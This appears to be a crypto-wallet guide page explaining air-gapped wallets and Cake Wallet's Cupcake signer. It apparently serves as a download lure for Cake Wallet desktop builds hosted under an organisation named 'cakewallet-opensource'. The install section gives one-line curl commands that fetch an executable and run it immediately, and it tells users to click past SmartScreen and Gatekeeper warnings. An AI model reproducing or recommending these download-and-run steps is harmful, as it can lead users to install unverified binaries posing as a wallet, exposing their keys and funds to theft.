![Cake Wallet air gapped wallet guide](assets/cake-wallet-air-gapped-wallet-article-banner.png)

# What an Air-Gapped Wallet Is and How Cake Wallet Fits

Offline signing explained, and why the app itself is not air-gapped.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

An air-gapped wallet holds keys on a device that never touches a network, and moves signed transactions by QR or removable media. Cake Wallet on a phone or desktop is a hot wallet; Cupcake turns a spare phone into an offline signer that pairs by QR, and it does not pair with the macOS or Linux desktop builds.

<!-- ARTICLE-BODY-BEGIN -->

## What air-gapped means
Air-gapped means there is no network path at all, not merely a device that stays offline most of the time. Signing happens on the isolated device; the transaction travels as data, and the signed result travels back the same way.

That isolation is what makes the setup resistant to remote compromise. It does nothing about a lost device, a weak backup or a person who can read your screen.

## Why Cake Wallet is not one
The app connects to nodes, checks prices and swaps through providers. It is a hot wallet with a PIN, and calling it air-gapped would be false.

What it can do is act as the online half of an air-gapped setup, holding a watch-only wallet and broadcasting what the offline device signs. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md">Hardware wallets that work with Cake Wallet</a> covers the device route for the same pattern.

## Pairing Cupcake
Cupcake is the phone-based signer: installed on a spare handset that stays offline, paired with Cake Wallet by scanning a code, then used to sign by scanning in both directions. Keys never leave the offline phone.

It pairs with the mobile app and not with the desktop builds, which decides the setup for desktop-only users. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md">Cupcake pairing with Cake Wallet</a> covers the two-way scan and the failure modes.

## Coins Cupcake signs
Bitcoin, Monero and Litecoin are the established set, with Zcash signing on newer builds. A coin outside that set stays a hot-wallet coin unless you use a hardware device that supports it.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Cake Wallet supported coins</a> lists the full coin set, so the overlap between what you hold and what can be signed offline is easy to see.

## Cold storage trade-offs
Cold storage is slower and needs planning: every spend is a two-device ritual, and a lost device means a restore from the phrase. For long-term holdings that is a fair trade; for daily spending it is friction that pushes people back to a hot wallet with everything in it.

The practical answer most people land on is both: a small hot balance and the rest in cold storage.

## Losing the device
An air-gapped device is a single point of failure like any other. If it dies, the funds are recoverable from its phrase, which is why that phrase has to be written down somewhere other than the device.

If the device is lost rather than broken, the same phrase restores the wallet elsewhere, and the old device becomes an empty shell that cannot spend. That is the property you are paying for.

## Getting the app
Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> on the online side, and the current Cupcake build on the offline phone before it goes offline for good.

Install first, then disconnect. An offline phone that still needs an app update is not yet air-gapped.

## FAQ
### Is Cake Wallet a cold wallet?
No. It is a hot wallet; Cupcake turns a spare phone into an offline signer that pairs with it.
### Can a cold wallet get hacked?
Not remotely while it stays offline. It can be lost, coerced or restored on a compromised machine later.
### What happens if I lose my cold wallet?
The phrase restores the funds elsewhere. Without the phrase, the funds are gone.
### Is a card-style signer air-gapped?
Only if it never connects to a network. A device that signs through a phone's connection is not air-gapped in the strict sense.
### How much does a cold wallet cost?
Cupcake costs nothing beyond a spare phone. Hardware devices vary by vendor.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[hardware wallets that work with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-hardware-wallet.md) · [Cupcake pairing with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md) · [Cake Wallet supported coins](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
